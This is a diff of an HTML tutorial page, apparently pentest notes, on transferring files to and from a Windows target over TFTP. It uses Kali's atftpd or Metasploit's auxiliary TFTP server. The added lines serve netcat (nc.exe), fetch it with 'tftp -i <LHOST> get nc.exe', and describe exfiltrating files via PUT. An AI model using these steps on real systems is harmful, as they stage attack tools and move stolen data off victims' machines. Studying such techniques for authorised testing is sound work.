@@ -24,21 +24,31 @@ grep 192.168.1.101 /var/log/syslog<br/>
 <br/>
 <br/>
 <br/>
-Starting the Server <br/>
-Kali comes with a TFTP server installed, atftpd, which can be started with a simple service atftpd start. I've always had a hell of a time getting it configured and working though, and I rarely need to start and keep running a TFTP server as a service, so I just use the simpler Metasploit module.<br/>
+Starting the built-in atftpd server<br/>
+Kali comes with a TFTP server installed, atftpd, which can be started with a simple service atftpd start. <br/>
+mkdir /tftp<br/>
+atftpd --daemon --port 69 /tftp<br/>
+cp /usr/share/windows-binaries/nc.exe /tftp/<br/>
+<br/>
+And connect to it from Windows:<br/>
+tftp -i &lt;LHOST&gt; get nc.exe<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+TFTP with Measploit Aux module<br/>
+I've always had a hell of a time getting it configured and working though, and I rarely need to start and keep running a TFTP server as a service, so I just use the simpler Metasploit module.<br/>
 &nbsp;<br/>
 Metasploit, like with FTP, has an auxiliary TFTP server module at auxiliary/server/tftp. Set the module options, including TFTPROOT, which determines which directory to serve up, and OUTPUTPATH if you want to capture TFTP uploads from Windows as well.<br/>
 &nbsp;<br/>
 <img src="https://blog.ropnop.com/content/images/2016/06/metasploit_tftp.png" /><br/>
 &nbsp;Downloading the Files <br/>
 Again, assuming the tftp utility is installed, you can grab a file with one line from the Windows prompt. It doesn't require any authentication. Just simply use the -i flag and the GET action. <br/>
-&nbsp;<br/>
-<img src="https://blog.ropnop.com/content/images/2016/06/windows_tftp_get.png" /><br/>
-&nbsp;<br/>
+&nbsp; <br/>
 Exfiltrating files via TFTP is simple as well with the PUT action. The Metasploit server saves them in /tmp by default<br/>
 &nbsp;<br/>
 <img src="https://blog.ropnop.com/content/images/2016/06/windows_tftp_put.png" /><br/>
-&nbsp;<br/>
+<br/>
 TFTP is a convenient, simple way to transfer files as it doesn't require authentication and you can do everything in a single command.<br/>
 &nbsp;<br/>
 <b>Sidenote: Installing TFTP</b>. As I mentioned, TFTP is not included by default on newer versions of Windows. If you really wanted to, you can actually enable TFTP from the command line:<br/>
